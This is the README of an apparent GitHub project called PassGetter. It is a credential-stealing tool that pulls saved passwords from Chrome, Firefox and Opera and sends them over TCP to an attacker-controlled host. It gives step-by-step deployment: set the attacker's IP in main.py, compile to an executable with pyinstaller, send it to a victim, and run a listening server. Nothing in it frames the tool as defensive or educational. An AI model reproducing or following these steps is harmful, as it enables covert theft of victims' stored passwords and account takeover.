# PassGetter
Extract saved passwords of the browsers (i.e Chrome, Firefox, Opera) in the form of .db files and transfer them to the attacker via sockets

## How it works
![alt text](https://media.discordapp.net/attachments/733792205663371286/755806305016610842/image.png)

Basically when u send the file to the victim's computer it processes the system information (OS name) and then it searches for the path to the saved credentials of the browser (look into the code for more info) after that it extracts the data in a .db format and sends it to the attacker via TCP.

## How to make it work

Put the ip address to your machine in _main.py_  on line 82
```
host = "<Your_IP>"
```
Convert the _main.py_ to _.exe_ or a linux binary executable using pyinstaller
```
pyinstaller --path <Path to Python>\Python\Lib\site-packages\pywin32_system32 --onefile main.py
``` 
Then send it to the victim and run the _server.py_ inside the sockets folder
```
python3 server.py
```
and wait for the magic to happen

## Requirements

Make sure to install the requirements before converting it to _.exe_ or else the conversion will fail
```
pip install -r requirements.txt
```

## Credits
<ul>
<li>Firefox Pass Extraction - unode (https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py)</li>
<li>Chrome Pass Extraction - Stackoverflow (https://stackoverflow.com/questions/61099492/chrome-80-password-file-decryption-in-python)</li>
